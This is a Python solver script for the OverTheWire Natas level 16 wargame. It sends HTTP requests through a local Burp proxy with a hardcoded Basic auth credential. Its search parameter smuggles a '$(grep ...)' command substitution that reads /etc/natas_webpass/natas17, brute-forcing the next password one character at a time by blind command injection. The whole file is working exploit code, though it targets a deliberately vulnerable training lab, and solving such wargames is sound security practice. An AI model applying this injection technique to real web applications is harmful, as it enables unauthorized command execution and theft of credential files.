import requests

#Porxying through Burp suite
http_proxy = "http://127.0.0.1:8080"
https_proxy = "https://127.0.0.1:8080"

proxyDict = {
    "http" : http_proxy,
    "https" : https_proxy
}

pw = ''
for x in range(1,32):
    for char in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789':
        res = requests.get('http://natas16.natas.labs.overthewire.org/',
                           params='needle=$(grep -E ^' + pw + char + '.*$ /etc/natas_webpass/natas17)anythings&submit=Search',
                           headers={'Authorization': 'Basic bmF0YXMxNjpUUkQ3aVpyZDVnQVRqajlQa1BFdWFPbGZFakhxajMyVg=='},
                           proxies=proxyDict)
        if not "anythings" in res.text:
            pw = pw + char
            print ('Password found: ' +pw)